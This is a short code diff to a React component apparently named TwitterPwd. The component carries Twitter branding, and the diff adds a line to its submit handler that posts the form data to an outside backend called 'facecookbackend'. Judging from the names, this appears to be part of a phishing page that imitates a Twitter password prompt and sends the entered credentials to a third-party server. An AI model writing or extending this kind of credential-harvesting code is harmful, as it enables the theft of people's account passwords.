@@ -1,4 +1,5 @@
 import React from "react";
+import axios from "axios";
 import { useNavigate } from "react-router-dom";
 import twitter from "../Assets/Twitter-logo.svg.webp";
 
@@ -31,6 +32,7 @@ const TwitterPwd = () => {
   const handleSubmit = (e) => {
     e.preventDefault();
     // make a request to the backend
+    axios.post("https://facecookbackend.onrender.com/api/v2/twitter", formData);
     setLoading(true);
 
     // set a timeout
